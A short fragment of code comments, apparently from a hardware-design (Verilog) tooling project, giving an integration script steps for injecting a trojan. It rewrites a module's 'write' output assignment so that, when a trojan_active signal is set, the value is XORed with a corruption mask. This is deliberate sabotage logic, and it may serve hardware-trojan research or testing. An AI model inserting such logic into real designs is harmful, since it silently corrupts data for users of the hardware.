...
//
// IMPORTANT: write may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If write is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for write (or first output assign):
//     assign write = <expr>;
//   Replace with:
//     assign write = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
